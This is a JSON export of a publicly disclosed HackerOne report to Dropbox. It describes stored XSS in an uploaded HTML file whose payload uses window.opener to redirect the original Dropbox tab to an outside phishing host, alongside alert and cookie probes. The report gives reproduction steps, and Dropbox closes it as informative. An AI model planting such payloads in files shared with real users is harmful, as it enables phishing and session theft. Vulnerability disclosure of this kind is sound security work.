{"id":44739,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDczOQ==","url":"https://hackerone.com/reports/44739","title":"Unvalidated Redirects and Stored XSS","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2015-01-22T13:45:48.310Z","submitted_at":"2015-01-22T13:45:48.310Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aarmageddon","url":"/aarmageddon","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":461,"url":"https://hackerone.com/dropbox","handle":"dropbox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Dropbox","twitter_handle":"","website":"https://www.dropbox.com","about":"Your stuff, anywhere"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-03-05T04:07:23.298Z","bug_reporter_agreed_on_going_public_at":"2015-02-03T04:07:11.462Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\r\n\r\nThis bug might interest you.\r\n\r\nIn the process of testing , I uploaded a file which contained the scripts:\r\n\r\n\u003cscript\u003e\r\nwindow.opener.location.replace('http://blackhorse.x10host.com/test.php');\r\n\u003c/script\u003e\r\n\u003cimg src='2' onerror= \"alert('XSS')\" \u003e\r\n\u003csvg/onload=prompt(123);\u003e \r\n\u003cscript\u003ealert(document.domain)\u003c/script\u003e\r\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\r\n\r\nOn opening of the uploaded file through the events section, the XSS pop-ups come up and also the Dropbox user is redirected to the attackers site.\r\n\r\nOne can share the link of the uploaded file with another dropbox user,once he adds it to its account and views it,his account can be compromised.\r\n\r\nKindly please refer to the video attached.\r\n\r\nThanks and Regards\r\nNishant","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":27599,"file_name":"dropbox.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/027/599/d48ed02346e1acf6ef32596a606da6bee59d2b67/dropbox.mp4?response-content-disposition=attachment%3B%20filename%3D%22dropbox.mp4%22%3B%20filename%2A%3DUTF-8%27%27dropbox.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTQR22CE2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150106Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHylhpFJOF4pRe7XlaDX6z3BLEup%2BswnNkaACr%2Fwjwr8AiASjuyeD0TYwrZA5sOldf5eC6UQrO8hSHC9jNR%2BVNumhyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMfK%2BofD1wJOHYcOUJKtcDnC3f8Y3jglGs7z8YlxF9bdYkYlsSrPxEkx9hDqtH%2BQ3u1daZrwyM6F3WHlk0a%2BWNezGk%2FnRxFWuvgXlXXAEBaCUWEe1UXv97gs6KKr%2F4fZ92%2FH3VXeVMioYLi220Z8qDdmiwSK2Z%2FPfK0nlRhO3v9Ee3r3C7BMq5B4DRnfxp0cJyzU%2FHbMNzQNjyO%2BlGzreHCzcyKBe%2FoFAr2W6xbLokCINrIUxMnvI9Mxs7SraD%2FF2sZw8Ln4uZ6aJweQoOPwsnYKkrRjb370Lt%2FREkrEj9pcgae0C9R5BTZegZaqNN6CzMkZfNHB7RmNrhJFg6j7%2BfPYLcWFNxzvJV9dbVJdocqrM5Jmi3hE47KOBrMSGuFrCha2vRk9P64hqfhM1GdDtMLFZZn5VqOJgdyVWZ8bTrZpmlBP%2FJ6YiHIaMTH8G%2FRndaRrVRAR8iOSqWok%2FikWajxMvcVA29H%2F5RznwCFPkLrSbv34tOiWcwVp50Yy3HjkGq4LnY67LMRRRIwThQ9vc%2BM3G9xlb7TwO6%2F3vE5U6azDCH6hDFQ3Xi8ZJVYrTOOWINnf%2BC3BIhvL8Uql%2FhI1vUmbQiAR01xN%2FdEQ9ReTSo0pfJ3SDSXhBXiwUW0IRKspJO189rJyI3MImNkYsGOqYBwdOGh60JXyl1FPj8jwEbnfg6var6H0hyaUwn%2B%2FnamMWODqDwoSJI6f0Q6RJHnQJo2gfc6OFgj1W2B%2FGcJDL4gMvwPBD8bBDDMSaZ3x1nqw%2FhzMwsaQP%2BTnUJEKAVQSe3o5Yvwzg%2FSvpNP%2By981FbIZs9aWoGNPHY48ZIUNdNLCWPS2PxNm9xHrAxEcqn8ib1XLvQQS%2FALl2CG36%2BewUP2tPIf%2BIPmw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9b23c5cc2965ba5e3c142185c5ba7c80f1f4e6b7cd34e5f77be70fe3f74ba7e8","file_size":1517342,"type":"video/mp4"}],"allow_singular_disclosure_at":"2015-03-05T04:07:12.311Z","allow_singular_disclosure_after":-208436034.33748093,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":315812,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Kindly let me know if you need more information.","automated_response":false,"created_at":"2015-01-22T14:47:49.544Z","updated_at":"2015-01-22T14:47:49.544Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":318595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wasn't able to open your video POC.\n\nCan you tell me what the link is when you are able to execute the XSS?","automated_response":false,"created_at":"2015-01-27T03:22:27.798Z","updated_at":"2015-01-27T03:22:27.798Z","actor":{"username":"reidski","cleared":false,"url":"/reidski","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":318877,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi ,\n\nPlease view the video on the link https://www.dropbox.com/s/mlhnuvjis0paeh7/dropbox.mp4?dl=0 , as it might be easy to understand.\n\nIt's a different kind of XSS as here the XSS scripts get executed on domain https://dl-web.dropbox.com and this execution of scripts redirects the domain https://dropbox.com to a third party phishing site.\n\nIn case the video is still not working, kindly follow the below steps to reproduce the issue.\n\nStep 1 : Create a sample HTML file with the following code:\n\n\u003cscript\u003e\nwindow.opener.location.replace('http://blackhorse.x10host.com/test.php');\n\u003c/script\u003e\n\u003cimg src='2' onerror= \"alert('XSS')\" \u003e\n\u003csvg/onload=prompt(123);\u003e \n\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n\nStep 2: Upload the HTML file created. \n\nStep 3: Go to Events--\u003e Select the File--\u003eEvent Details page--\u003e Click on the file--\u003ethe File opens in new tab with all XSS scripts executed.\n\nStep 4 : Go back to previous tab and observe that Dropbox is redirected to http://blackhorse.x10host.com/test.php (sample site)\n\nKindly let me know if you need more information.\n\nThank you\nNishant\n","automated_response":false,"created_at":"2015-01-27T15:23:42.260Z","updated_at":"2015-01-27T15:23:42.260Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":321754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nOur security team has reviewed your report and has decided that this does not pose a security threat to Dropbox users.\n\nThis method would require a user to upload a malicious file onto their own account and then execute it. While it is possible to share a malicious html file to a user and have it executed in a similar manner, this is not considered a security vulnerability. Also, this issue is well mitigated by the fact that the file is hosted on dl-web.dropbox.com, and not on www.dropbox.com. \n\nWhile itâ€™s not considered a security vulnerability, the security team thanks you for your feedback on this issue and may provide a fix for it at a later date. \n\nWe look forward to receiving reports from you in the future.\n\nBest,\nReid","automated_response":false,"created_at":"2015-01-31T00:18:27.776Z","updated_at":"2015-01-31T00:18:27.776Z","actor":{"username":"reidski","cleared":false,"url":"/reidski","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":321755,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"This method would require a user to upload a malicious file onto their own account and then execute it. While it is possible to share a malicious html file to a user and have it executed in a similar manner, this is not considered a security vulnerability. Also, this issue is well mitigated by the fact that the file is hosted on dl-web.dropbox.com, and not on www.dropbox.com.","automated_response":false,"created_at":"2015-01-31T00:18:37.312Z","updated_at":"2015-01-31T00:18:37.312Z","actor":{"username":"reidski","cleared":false,"url":"/reidski","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":321835,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Reid,\n\nEven if the script is getting executed on dl-web.dropbox.com, the domain www.dropbox is getting redirected to a malicious site. Why only XSS matters to all the organisations,here its unvalidated redirect.\n\nThe main impact here is on the domain www.dropbox.com which is getting redirected.\n\nTo fix this that the redirection doesn't happen on www.dropbox.com due to execution of scripts on dl-web.dropbox.com,you just need to implement a small fix.\n\nWhen the domain www.dropbox.com will get redirected to a malicious site,it dropbox that will get impacted. This issue is solved by Hackerone,Twitter,Facebook etc.\n\nThanks\nNishant","automated_response":false,"created_at":"2015-01-31T02:21:43.481Z","updated_at":"2015-01-31T02:21:43.481Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":321837,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here the pop-ups are in dl-dropbox.com, but did you notice that the domain dropbox.com was not longer present in the video and the user was redirected to my sample site.\n\nDid you notice that?","automated_response":false,"created_at":"2015-01-31T02:23:09.117Z","updated_at":"2015-01-31T02:23:09.117Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":321838,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here the script which cause the impact was window.opener.location.replace('http://blackhorse.x10host.com/test.php'); but you people want only normal XSS scripts.\n\nLook into it once","automated_response":false,"created_at":"2015-01-31T02:25:19.428Z","updated_at":"2015-01-31T02:25:19.428Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":322525,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on this?","automated_response":false,"created_at":"2015-02-02T08:43:54.258Z","updated_at":"2015-02-02T08:43:54.258Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":323227,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This would still require a malicious file to be present in the user's Dropbox. While it is possible to share a malicious html file to a user and have it executed in a similar manner, this is not considered a security vulnerability. ","automated_response":false,"created_at":"2015-02-03T01:26:48.228Z","updated_at":"2015-02-03T01:26:48.228Z","actor":{"username":"reidski","cleared":false,"url":"/reidski","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":323319,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-02-03T04:07:11.910Z","updated_at":"2015-02-03T04:07:11.910Z","first_to_agree":true,"actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":323386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"And this is a proper stored XSS issue.","automated_response":false,"created_at":"2015-02-03T06:03:51.957Z","updated_at":"2015-02-03T06:03:51.957Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":326576,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Public disclosure please","automated_response":false,"created_at":"2015-02-06T04:43:48.629Z","updated_at":"2015-02-06T04:43:48.629Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Public disclosure please","automated_response":false,"created_at":"2015-02-24T16:30:31.471Z","updated_at":"2015-02-24T16:30:31.471Z","actor":{"username":"aarmageddon","cleared":false,"url":"/aarmageddon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/940/2eb5f3547c00aa8897e18f7a0e049104f1ae7617_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":346479,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-03-05T04:07:23.661Z","updated_at":"2015-03-05T04:07:23.661Z","actor":{"url":"/dropbox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Dropbox"}},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}